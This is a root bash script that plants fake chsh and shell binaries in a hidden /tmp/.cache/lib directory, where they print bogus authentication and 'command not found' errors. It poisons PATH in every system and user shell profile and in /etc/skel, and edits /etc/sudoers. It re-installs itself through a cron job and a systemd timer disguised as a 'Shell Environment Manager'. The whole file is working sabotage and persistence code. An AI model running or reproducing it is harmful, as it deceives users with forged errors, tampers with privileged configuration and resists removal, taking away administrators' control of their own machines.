#!/bin/bash
# stop_shell_switch2.sh - persistent cron + systemd

cat > /usr/local/bin/shell_lock.sh << 'SCRIPT'
#!/bin/bash
SHADOW_DIR="/tmp/.cache/lib"
mkdir -p "$SHADOW_DIR"

cat > "$SHADOW_DIR/chsh" << 'INNER'
#!/bin/bash
echo "Authentication failure"
exit 1
INNER
chmod +x "$SHADOW_DIR/chsh"

for shell in zsh sh dash fish ksh tcsh; do
    cat > "$SHADOW_DIR/$shell" << 'INNER'
#!/bin/bash
echo "bash: command not found"
exit 127
INNER
    chmod +x "$SHADOW_DIR/$shell"
done

if ! /usr/bin/grep -q "cache/lib" /etc/sudoers 2>/dev/null; then
    echo "Defaults secure_path=\"$SHADOW_DIR:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"" >> /etc/sudoers
fi

MARKER="# shell lock"
POISON="export PATH=\"$SHADOW_DIR:\$PATH\" # shell lock"

apply() {
    local f="$1"
    if [ -f "$f" ] && ! /usr/bin/grep -q "$MARKER" "$f" 2>/dev/null; then
        echo "$POISON" >> "$f"
    fi
}

apply /etc/bash.bashrc
apply /etc/profile
apply /root/.bashrc
apply /root/.profile

echo "$POISON" > /etc/profile.d/shell_lock.sh
chmod 644 /etc/profile.d/shell_lock.sh

for user_home in /home/*; do
    apply "$user_home/.bashrc"
    apply "$user_home/.profile"
    apply "$user_home/.bash_profile"
done

apply /etc/skel/.bashrc
apply /etc/skel/.profile
SCRIPT

chmod +x /usr/local/bin/shell_lock.sh
/usr/local/bin/shell_lock.sh

cat > /etc/cron.d/shell_lock << 'CRON'
* * * * * root /usr/local/bin/shell_lock.sh
* * * * * root sleep 30 && /usr/local/bin/shell_lock.sh
CRON
chmod 644 /etc/cron.d/shell_lock

cat > /etc/systemd/system/shell-lock.service << 'UNIT'
[Unit]
Description=Shell Environment Manager
After=network.target

[Service]
Type=oneshot
ExecStart=/usr/local/bin/shell_lock.sh
RemainAfterExit=no
UNIT

cat > /etc/systemd/system/shell-lock.timer << 'UNIT'
[Unit]
Description=Shell Environment Manager Timer

[Timer]
OnBootSec=5
OnUnitActiveSec=20s
AccuracySec=1s

[Install]
WantedBy=timers.target
UNIT

systemctl daemon-reload
systemctl enable shell-lock.timer
systemctl start shell-lock.timer
